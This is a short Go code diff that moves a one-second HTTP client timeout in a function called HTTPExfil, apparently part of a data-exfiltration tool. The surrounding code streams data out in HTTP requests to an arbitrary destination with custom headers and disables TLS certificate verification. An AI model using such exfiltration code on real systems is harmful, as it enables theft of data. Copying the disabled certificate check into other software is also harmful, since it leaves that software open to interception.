@@ -130,6 +130,9 @@ func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 		http.DefaultTransport.(*http.Transport).TLSClientConfig =
 			&tls.Config{InsecureSkipVerify: true}
 
+		// Set timeout to 1 second
+		http.DefaultClient.Timeout = time.Second
+
 		for {
 			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
 				return nil
@@ -152,9 +155,6 @@ func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 			for k, v := range headers {
 				req.Header.Set(k, v)
 			}
-
-			// Set timeout to 1 second
-			http.DefaultClient.Timeout = time.Second
 
 			// Send Message
 			http.DefaultClient.Do(req)
